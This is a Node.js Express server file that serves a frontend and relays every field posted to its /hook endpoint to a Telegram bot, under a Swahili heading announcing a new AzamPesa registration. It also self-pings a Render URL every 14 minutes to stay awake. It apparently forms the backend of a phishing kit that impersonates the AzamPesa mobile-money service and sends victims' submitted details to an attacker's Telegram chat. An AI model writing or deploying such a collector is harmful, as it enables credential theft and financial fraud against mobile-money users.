const express = require("express");
const axios = require("axios");
const cors = require("cors");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

if (!botToken || !chatId) {
  console.error("BOT_TOKEN or CHAT_ID missing");
  process.exit(1);
}

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ Serve static frontend files from public/
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/hook", async (req, res) => {
  const data = req.body;

  let message = "📥 Kuna usajili mpya wa AzamPesa!\n\n";
  for (let key in data) {
    message += `${key.toUpperCase()}: ${data[key]}\n`;
  }

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message
    });

    res.status(200).json({ status: "success" });
  } catch (error) {
    console.error("Telegram Error:", error.message);
    res.status(500).json({ status: "error", message: "Telegram failed" });
  }
});

setInterval(() => {
  axios.get("https://your-render-app.onrender.com/")
    .then(() => console.log("Self-ping successful"))
    .catch(err => console.error("Self-ping failed:", err.message));
}, 1000 * 60 * 14);

app.listen(PORT, () => {
  console.log(`Server running on ${PORT}`);
});